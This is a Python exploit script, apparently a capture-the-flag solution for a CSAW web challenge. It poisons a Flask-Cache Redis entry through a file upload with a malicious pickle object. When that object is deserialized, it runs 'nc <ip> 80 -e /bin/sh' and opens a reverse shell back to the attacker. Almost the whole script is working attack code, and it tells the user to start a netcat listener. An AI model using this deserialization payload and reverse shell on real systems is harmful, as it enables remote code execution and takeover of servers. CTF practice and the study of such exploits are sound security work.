!/usr/bin/env python3
import pickle
import os
import requests

baseurl = 'http://web.chal.csaw.io:5000/'

# payload that will be unpickled by flask-cache with redis backend.
class RunBinSh(object):
    def __init__(self, myIp):
        self.myIp = myIp
    def __reduce__(self):
        cmd = (f'nc {self.myIp} 80 -e /bin/sh')
        return os.system,(cmd,)


# corrupt the redis cache at pos i with payload, 
# exploiting the fact that redis will unpickle/deserialize the python object on request.
def postRequest(i, payload):
    body = {
        "title": f"flask_cache_view//test{i}"
    }
    response = requests.post(baseurl, data=body, files=dict(content=payload))


def exploit():
    print('Start a rev-shell at port 80: nc -lvnp 80')
    print('What is your external IP?')
    ip = input()
    print('You should soon get a rev-shell. The flag is in the filesystem root. :)')
    payload = b'!' + pickle.dumps(RunBinSh(ip))
    postRequest(25, payload)
    requests.get(f'{baseurl}/test25')


if __name__ == '__main__':
    exploit()